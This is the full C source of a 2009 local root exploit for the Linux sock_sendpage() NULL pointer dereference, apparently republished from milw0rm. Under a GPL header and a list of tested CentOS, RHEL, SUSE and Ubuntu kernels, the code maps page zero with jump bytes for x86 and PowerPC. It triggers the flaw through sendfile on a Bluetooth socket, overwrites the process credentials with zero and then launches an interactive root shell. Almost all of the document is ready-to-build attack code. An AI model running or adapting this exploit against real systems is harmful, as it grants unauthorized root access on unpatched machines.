/*
 *  Linux sock_sendpage() NULL pointer dereference
 *  Copyright 2009 Ramon de Carvalho Valle <ramon@risesecurity.org>
 *
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 2 of the License, or
 *  (at your option) any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program; if not, write to the Free Software
 *  Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA
 *
 */

/*
 * This exploit was written to illustrate the exploitability of this
 * vulnerability[1], discovered by Tavis Ormandy and Julien Tinnes, on ppc
 * and ppc64.
 *
 * This exploit makes use of the SELinux and the mmap_min_addr problem to
 * exploit this vulnerability on Red Hat Enterprise Linux 5.3 and CentOS 5.3.
 * The problem, first noticed by Brad Spengler, was described by Red Hat in
 * Red Hat Knowledgebase article: Security-Enhanced Linux (SELinux) policy and
 * the mmap_min_addr protection[2].
 *
 * Support for i386 and x86_64 was added for completeness. For a more complete
 * implementation, refer to Brad Spengler's exploit[3], which also implements
 * the personality trick[4] published by Tavis Ormandy and Julien Tinnes.
 *
 * Linux kernel versions from 2.4.4 to 2.4.37.4, and from 2.6.0 to 2.6.30.4
 * are vulnerable.
 *
 * This exploit was tested on:
 *
 * CentOS 5.3 (2.6.18-128.7.1.el5) is not vulnerable
 * CentOS 5.3 (2.6.18-128.4.1.el5)
 * CentOS 5.3 (2.6.18-128.2.1.el5)
 * CentOS 5.3 (2.6.18-128.1.16.el5)
 * CentOS 5.3 (2.6.18-128.1.14.el5)
 * CentOS 5.3 (2.6.18-128.1.10.el5)
 * CentOS 5.3 (2.6.18-128.1.6.el5)
 * CentOS 5.3 (2.6.18-128.1.1.el5)
 * CentOS 5.3 (2.6.18-128.el5)
 * CentOS 4.8 (2.6.9-89.0.9.EL) is not vulnerable
 * CentOS 4.8 (2.6.9-89.0.7.EL)
 * CentOS 4.8 (2.6.9-89.0.3.EL)
 * CentOS 4.8 (2.6.9-89.EL)
 * Red Hat Enterprise Linux 5.3 (2.6.18-128.7.1.el5) is not vulnerable
 * Red Hat Enterprise Linux 5.3 (2.6.18-128.4.1.el5)
 * Red Hat Enterprise Linux 5.3 (2.6.18-128.2.1.el5)
 * Red Hat Enterprise Linux 5.3 (2.6.18-128.1.16.el5)
 * Red Hat Enterprise Linux 5.3 (2.6.18-128.1.14.el5)
 * Red Hat Enterprise Linux 5.3 (2.6.18-128.1.10.el5)
 * Red Hat Enterprise Linux 5.3 (2.6.18-128.1.6.el5)
 * Red Hat Enterprise Linux 5.3 (2.6.18-128.1.1.el5)
 * Red Hat Enterprise Linux 5.3 (2.6.18-128.el5)
 * Red Hat Enterprise Linux 4.8 (2.6.9-89.0.9.EL) is not vulnerable
 * Red Hat Enterprise Linux 4.8 (2.6.9-89.0.7.EL)
 * Red Hat Enterprise Linux 4.8 (2.6.9-89.0.3.EL)
 * Red Hat Enterprise Linux 4.8 (2.6.9-89.EL)
 * SUSE Linux Enterprise Server 11 (2.6.27.19-5)
 * SUSE Linux Enterprise Server 10 SP2 (2.6.16.60-0.21)
 * Ubuntu 8.10 (2.6.27-14) is not vulnerable
 * Ubuntu 8.10 (2.6.27-11)
 * Ubuntu 8.10 (2.6.27-9)
 * Ubuntu 8.10 (2.6.27-7)
 *
 * For i386 and ppc, compile with the following command:
 * gcc -Wall -o linux-sendpage linux-sendpage.c
 *
 * And for x86_64 and ppc64:
 * gcc -Wall -m64 -o linux-sendpage linux-sendpage.c
 *
 * [1] http://blog.cr0.org/2009/08/linux-null-pointer-dereference-due-to.html
 * [2] http://kbase.redhat.com/faq/docs/DOC-18042
 * [3] http://www.grsecurity.net/~spender/wunderbar_emporium2.tgz
 * [4] http://blog.cr0.org/2009/06/bypassing-linux-null-pointer.html
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/sendfile.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <unistd.h>

#if !defined(__always_inline)
#define __always_inline inline __attribute__((always_inline))
#endif

#if defined(__i386__) || defined(__x86_64__)
#if defined(__LP64__)
static __always_inline unsigned long
current_stack_pointer(void)
{
	unsigned long sp;

	asm volatile ("movq %%rsp,%0; " : "=r" (sp));

	return sp;
}

#else
static __always_inline unsigned long
current_stack_pointer(void)
{
	unsigned long sp;

	asm volatile ("movl %%esp,%0" : "=r" (sp));

	return sp;
}

#endif

#elif defined(__powerpc__) || defined(__powerpc64__)
static __always_inline unsigned long
current_stack_pointer(void)
{
	unsigned long sp;

	asm volatile ("mr %0,%%r1; " : "=r" (sp));

	return sp;
}

#endif

#if defined(__i386__) || defined(__x86_64__)
#if defined(__LP64__)
static __always_inline unsigned long
current_task_struct(void)
{
	unsigned long task_struct;

	asm volatile ("movq %%gs:(0),%0; " : "=r" (task_struct));

	return task_struct;
}

#else
#define TASK_RUNNING 0

static __always_inline unsigned long
current_task_struct(void)
{
	unsigned long task_struct, thread_info;

	thread_info = current_stack_pointer() & ~(4096 - 1);

	if (*(unsigned long *)thread_info >= 0xc0000000) {
		task_struct = *(unsigned long *)thread_info;

		/*
		 * The TASK_RUNNING is the only possible state for a process executing
		 * in user-space.
		 */
		if (*(unsigned long *)task_struct == TASK_RUNNING)
			return task_struct;
	}

	/*
	 * Prior to the 2.6 kernel series, the task_struct was stored at the end
	 * of the kernel stack.
	 */
	task_struct = current_stack_pointer() & ~(8192 - 1);

	if (*(unsigned long *)task_struct == TASK_RUNNING)
		return task_struct;

	thread_info = task_struct;

	task_struct = *(unsigned long *)thread_info;

	if (*(unsigned long *)task_struct == TASK_RUNNING)
		return task_struct;

	return -1;
}

#endif

#elif defined(__powerpc__) || defined(__powerpc64__)
#define TASK_RUNNING 0

static __always_inline unsigned long
current_task_struct(void)
{
	unsigned long task_struct, thread_info;

#if defined(__LP64__)
	task_struct = current_stack_pointer() & ~(16384 - 1);

#else
	task_struct = current_stack_pointer() & ~(8192 - 1);

#endif

	if (*(unsigned long *)task_struct == TASK_RUNNING)
		return task_struct;

	thread_info = task_struct;

	task_struct = *(unsigned long *)thread_info;

	if (*(unsigned long *)task_struct == TASK_RUNNING)
		return task_struct;

	return -1;
}

#endif

#if defined(__i386__) || defined(__x86_64__)
static unsigned long uid, gid;

static int
change_cred(void)
{
	unsigned int *task_struct;

	task_struct = (unsigned int *)current_task_struct();

	while (task_struct) {
		if (task_struct[0] == uid && task_struct[1] == uid &&
				task_struct[2] == uid && task_struct[3] == uid &&
				task_struct[4] == gid && task_struct[5] == gid &&
				task_struct[6] == gid && task_struct[7] == gid) {
			task_struct[0] = task_struct[1] =
			task_struct[2] = task_struct[3] =
			task_struct[4] = task_struct[5] =
			task_struct[6] = task_struct[7] = 0;
			break;
		}

		task_struct++;
	}

	return -1;
}

#elif defined(__powerpc__) || defined(__powerpc64__)
static int
change_cred(void)
{
	unsigned int *task_struct;

	task_struct = (unsigned int *)current_task_struct();

	while (task_struct) {
		if (!task_struct[0]) {
			task_struct++;
			continue;
		}

		if (task_struct[0] == task_struct[1] &&
				task_struct[0] == task_struct[2] &&
				task_struct[0] == task_struct[3] &&
				task_struct[4] == task_struct[5] &&
				task_struct[4] == task_struct[6] &&
				task_struct[4] == task_struct[7]) {
			task_struct[0] = task_struct[1] =
			task_struct[2] = task_struct[3] =
			task_struct[4] = task_struct[5] =
			task_struct[6] = task_struct[7] = 0;
			break;
		}

		task_struct++;
	}

	return -1;
}

#endif

#define PAGE_SIZE getpagesize()

int
main(void)
{
	char *addr;
	int out_fd, in_fd;
	char template[] = "/tmp/tmp.XXXXXX";

#if defined(__i386__) || defined(__x86_64__)
	uid = getuid(), gid = getgid();

#endif

	if ((addr = mmap(NULL, 0x1000, PROT_EXEC|PROT_READ|PROT_WRITE, MAP_FIXED|
			MAP_PRIVATE|MAP_ANONYMOUS, 0, 0)) == MAP_FAILED) {
		perror("mmap");
		exit(EXIT_FAILURE);
	}

#if defined(__i386__) || defined(__x86_64__)
#if defined(__LP64__)
	addr[0] = '\xff';
	addr[1] = '\x24';
	addr[2] = '\x25';
	*(unsigned long *)&addr[3] = 8;
	*(unsigned long *)&addr[8] = (unsigned long)change_cred;

#else
	addr[0] = '\xff';
	addr[1] = '\x25';
	*(unsigned long *)&addr[2] = 8;
	*(unsigned long *)&addr[8] = (unsigned long)change_cred;

#endif

#elif defined(__powerpc__) || defined(__powerpc64__)
#if defined(__LP64__)
	/*
	 * The use of function descriptors by the Power 64-bit ELF ABI requires
	 * the use of a fake function descriptor.
	 */
	*(unsigned long *)&addr[0] = *(unsigned long *)change_cred;

#else
	addr[0] = '\x3f';
	addr[1] = '\xe0';
	*(unsigned short *)&addr[2] = (unsigned short)change_cred>>16;
	addr[4] = '\x63';
	addr[5] = '\xff';
	*(unsigned short *)&addr[6] = (unsigned short)change_cred;
	addr[8] = '\x7f';
	addr[9] = '\xe9';
	addr[10] = '\x03';
	addr[11] = '\xa6';
	addr[12] = '\x4e';
	addr[13] = '\x80';
	addr[14] = '\x04';
	addr[15] = '\x20';

#endif

#endif

	if ((out_fd = socket(PF_BLUETOOTH, SOCK_DGRAM, 0)) == -1) {
		perror("socket");
		exit(EXIT_FAILURE);
	}

	if ((in_fd = mkstemp(template)) == -1) {
		perror("mkstemp");
		exit(EXIT_FAILURE);
	}

	if(unlink(template) == -1) {
		perror("unlink");
		exit(EXIT_FAILURE);
	}

	if (ftruncate(in_fd, PAGE_SIZE) == -1) {
		perror("ftruncate");
		exit(EXIT_FAILURE);
	}

	sendfile(out_fd, in_fd, NULL, PAGE_SIZE);

	execl("/bin/sh", "sh", "-i", NULL);

	exit(EXIT_SUCCESS);
}

// milw0rm.com [2009-08-31]